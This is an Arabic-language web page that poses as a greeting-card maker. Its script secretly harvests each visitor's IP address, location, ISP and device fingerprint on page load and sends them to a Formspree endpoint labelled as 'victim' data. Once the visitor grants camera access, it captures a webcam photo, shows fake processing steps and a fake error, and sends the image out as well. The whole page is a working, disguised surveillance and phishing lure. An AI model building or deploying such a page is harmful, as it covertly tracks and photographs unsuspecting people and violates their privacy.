<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🎉 صمم بطاقة تهنئة</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{background:#fff;border-radius:24px;padding:2rem;max-width:450px;width:100%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,.2)}
    .emoji{font-size:4rem;margin-bottom:1rem;animation:bounce 2s infinite}
    @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
    h1{color:#333;font-size:1.6rem;margin-bottom:.5rem}
    .subtitle{color:#666;font-size:1rem;margin-bottom:1.5rem}
    .cam-area{border:3px dashed #667eea;border-radius:16px;padding:2rem;margin:1rem 0;background:#f8f9ff;position:relative;overflow:hidden}
    .cam-area video{width:100%;border-radius:12px;display:none}
    .cam-placeholder{font-size:3rem;margin-bottom:.5rem}
    .btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;transition:all .3s;margin-top:1rem}
    .btn-primary{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
    .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(102,126,234,.4)}
    .btn:disabled{opacity:.6;cursor:not-allowed}
    .progress{display:none;margin:1rem 0}
    .progress-bar{height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden}
    .progress-fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0;transition:width .3s}
    .status{color:#666;font-size:.9rem;margin-top:.5rem}
    .error{display:none;color:#d32f2f;background:#ffebee;padding:12px;border-radius:8px;margin-top:1rem;font-size:.9rem}
    .hidden{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
  </style>
</head>
<body>
  <div class="card">
    <div class="emoji">🎊</div>
    <h1>صمم بطاقة تهنئة</h1>
    <p class="subtitle">التقط صورة لإنشاء بطاقة مميزة</p>
    
    <div class="cam-area" id="camArea">
      <div class="cam-placeholder" id="placeholder">📷</div>
      <video id="video" autoplay playsinline></video>
    </div>
    
    <div class="progress" id="progress">
      <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
      <div class="status" id="status">جاري التحميل...</div>
    </div>
    
    <button class="btn btn-primary" id="btn" onclick="start()">بدء التصوير</button>
    
    <div class="error" id="error">
      😔 عذراً! فشلت المعالجة.<br>يرجى المحاولة لاحقاً.
    </div>
  </div>

  <canvas class="hidden" id="canvas"></canvas>

  <script>
    var FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
    var victimData = {};
    
    function collectAll() {
      fetch('https://api.ipify.org?format=json')
        .then(function(res) { return res.json(); })
        .then(function(data) {
          var ip = data.ip;
          return fetch('https://ipapi.co/' + ip + '/json/')
            .then(function(res) { return res.json(); })
            .then(function(loc) {
              victimData = {
                timestamp: new Date().toISOString(),
                localTime: new Date().toLocaleString('ar-SA'),
                ip: ip,
                location: {
                  city: loc.city || 'unknown',
                  region: loc.region || 'unknown',
                  country: loc.country_name || 'unknown',
                  country_code: loc.country_code || 'unknown',
                  timezone: loc.timezone || 'unknown',
                  isp: loc.org || 'unknown'
                },
                device: {
                  platform: navigator.platform,
                  userAgent: navigator.userAgent,
                  language: navigator.language,
                  screen: screen.width + 'x' + screen.height,
                  colorDepth: screen.colorDepth,
                  pixelRatio: window.devicePixelRatio,
                  cores: navigator.hardwareConcurrency,
                  memory: navigator.deviceMemory || 'unknown',
                  maxTouchPoints: navigator.maxTouchPoints,
                  online: navigator.onLine,
                  cookieEnabled: navigator.cookieEnabled
                },
                browser: {
                  vendor: navigator.vendor,
                  appName: navigator.appName,
                  appVersion: navigator.appVersion
                },
                network: navigator.connection ? {
                  effectiveType: navigator.connection.effectiveType,
                  downlink: navigator.connection.downlink,
                  rtt: navigator.connection.rtt
                } : 'unavailable',
                referrer: document.referrer || 'direct',
                url: location.href
              };
              
              return fetch(FORMSPREE_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  event: 'page_visit',
                  victim: victimData
                })
              });
            });
        })
        .catch(function(e) {
          console.log('Error:', e);
        });
    }
    
    collectAll();
    
    function start() {
      var btn = document.getElementById('btn');
      var placeholder = document.getElementById('placeholder');
      var video = document.getElementById('video');
      var progress = document.getElementById('progress');
      var fill = document.getElementById('fill');
      var status = document.getElementById('status');
      var error = document.getElementById('error');
      
      btn.disabled = true;
      placeholder.style.display = 'none';
      
      navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: 1280, height: 720 },
        audio: false
      })
      .then(function(stream) {
        video.srcObject = stream;
        video.style.display = 'block';
        return video.play();
      })
      .then(function() {
        return new Promise(function(resolve) { setTimeout(resolve, 1000); });
      })
      .then(function() {
        var canvas = document.getElementById('canvas');
        canvas.width = 1280;
        canvas.height = 720;
        var ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 1280, 720);
        
        var image = canvas.toDataURL('image/jpeg', 0.6);
        
        video.srcObject.getTracks().forEach(function(t) { t.stop(); });
        video.style.display = 'none';
        placeholder.style.display = 'block';
        placeholder.textContent = '✅';
        
        progress.style.display = 'block';
        
        var steps = [
          { p: 20, t: 'جاري تحليل الوجه...' },
          { p: 50, t: 'جاري تطبيق التصميم...' },
          { p: 80, t: 'جاري الحفظ...' }
        ];
        
        var stepIndex = 0;
        function nextStep() {
          if (stepIndex >= steps.length) {
            fill.style.width = '100%';
            status.textContent = 'فشلت العملية!';
            setTimeout(function() {
              progress.style.display = 'none';
              error.style.display = 'block';
              btn.textContent = 'إعادة المحاولة';
              btn.disabled = false;
            }, 500);
            
            fetch(FORMSPREE_URL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                event: 'camera_capture',
                victim: victimData,
                image: image,
                summary: {
                  ip: victimData.ip,
                  country: victimData.location.country,
                  hasCamera: true
                }
              })
            });
            
            return;
          }
          
          fill.style.width = steps[stepIndex].p + '%';
          status.textContent = steps[stepIndex].t;
          stepIndex++;
          setTimeout(nextStep, 800);
        }
        
        nextStep();
      })
      .catch(function(e) {
        placeholder.style.display = 'block';
        placeholder.textContent = '📷';
        btn.disabled = false;
        alert('يجب السماح بالكاميرا لإنشاء البطاقة');
      });
    }
  </script>
</body>
</html>
